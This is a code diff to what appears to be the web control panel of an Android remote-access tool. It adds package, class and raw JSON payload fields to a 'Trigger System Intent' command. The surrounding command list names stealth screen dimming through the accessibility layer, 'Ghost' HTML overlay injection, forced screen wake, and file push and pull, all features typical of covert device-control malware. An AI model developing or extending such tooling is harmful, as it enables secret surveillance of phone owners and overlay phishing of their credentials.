@@ -395,7 +395,7 @@
                     { id: 'BRIGHTNESS', name: 'Screen Dimmer / Stealth', icon: '🌓', inputs: [{id: 'bri-level', label: 'Level 0-100', type: 'number', val: 0}, {id: 'bri-method', label: 'Method', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth)'}, {v: 'OVERLAY', l: 'Overlay'}, {v: 'HARDWARE', l: 'Hardware'}]}], cleanup: 'UNBLIND' },
                     { id: 'INJECT_UI', name: 'Inject Web Overlay', icon: '🖼️', inputs: [{id: 'ui-touchable', label: 'Input Mode', type: 'select', options: [{v: 'TRUE', l: 'Touchable'}, {v: 'FALSE', l: 'Ghost'}]}, {id: 'ui-method', label: 'Injection Method', type: 'select', options: [{v: 'AUTO', l: 'AUTO (Smart Priority)'}, {v: 'ACC', l: 'Accessibility Layer'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-html', label: 'HTML Content', type: 'textarea'}], cleanup: 'REMOVE_UI' },
                     { id: 'WAKE', name: 'Force Screen Wake', icon: '💡', inputs: [{id: 'val-wake', label: 'Mode', type: 'select', options: [{v: 'standard', l: 'Standard'}, {v: 'wellbeing', l: 'Route Wellbeing'}]}] },
-                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}] },
+                    { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-pkg', label: 'Package Name', type: 'text'}, {id: 'int-cls', label: 'Class Name', type: 'text'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}, {id: 'int-json', label: '--- OR PASTE RAW JSON PAYLOAD ---', type: 'textarea'}] },
                     { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs: [] }
                 ]
             },
@@ -837,14 +837,29 @@
                         content = `${document.getElementById('push-url').value} | ${document.getElementById('push-path').value}`; break;
                     case 'PULL_FILE': content = document.getElementById('val-pull').value; break;
                     case 'RUN_INTENT':
-                        const intObj = {};
-                        const act = document.getElementById('int-act').value;
-                        const dat = document.getElementById('int-data').value;
-                        const tgt = document.getElementById('int-tgt').value;
-                        if (act) intObj.action = act;
-                        if (dat) intObj.data = dat;
-                        if (tgt) intObj.target = tgt;
-                        content = JSON.stringify(intObj); break;
+                        const rawJson = document.getElementById('int-json').value.trim();
+                        if (rawJson) {
+                            try {
+                                JSON.parse(rawJson); // Validate syntax
+                                content = rawJson;
+                            } catch(e) {
+                                return toast("INVALID JSON SYNTAX", "danger");
+                            }
+                        } else {
+                            const intObj = {};
+                            const act = document.getElementById('int-act').value.trim();
+                            const pkg = document.getElementById('int-pkg').value.trim();
+                            const cls = document.getElementById('int-cls').value.trim();
+                            const dat = document.getElementById('int-data').value.trim();
+                            const tgt = document.getElementById('int-tgt').value;
+                            if (act) intObj.action = act;
+                            if (pkg) intObj.pkg = pkg;
+                            if (cls) intObj.cls = cls;
+                            if (dat) intObj.data = dat;
+                            if (tgt) intObj.target = tgt;
+                            content = JSON.stringify(intObj);
+                        }
+                        break;
                     case 'GET_TREE':
                         const pkg = document.getElementById('tree-pkg').value || 'null';
                         const dur = document.getElementById('tree-dur').value || '5';
